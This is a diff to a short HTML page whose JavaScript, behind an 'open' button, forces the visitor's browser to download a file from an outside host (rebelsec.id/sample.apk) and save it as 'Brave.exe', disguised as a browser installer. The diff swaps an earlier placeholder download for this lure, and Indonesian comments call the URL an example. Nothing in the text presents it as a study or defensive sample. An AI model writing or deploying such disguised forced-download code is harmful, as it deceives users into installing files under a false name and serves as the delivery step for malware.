@@ -1,19 +1,17 @@
-
-<!-- Peace Be Upon You -->
-<!-- Puf -->
-<script language="javascript">
+<script>
 function Puf(uri, name) {
   var link = document.createElement("a");
-  link.download = name;
+  link.download = name; // Catatan: bisa diabaikan jika URL cross-origin
   link.href = uri;
+  document.body.appendChild(link);
   link.click();
-}
-function openWin()
-{
-Puf("google.com", "sw.apk")
+  link.remove();
 }
 
+function openWin() {
+  // Contoh dari google.com atau test.com
+  Puf("http://rebelsec.id/sample.apk", "Brave.exe");
+}
 </script>
-<center><h2>w Upon You</h2></center>
 
-<input type="button"  onclick="openWin();" value="open"/>
+<input type="button" onclick="openWin();" value="open" />
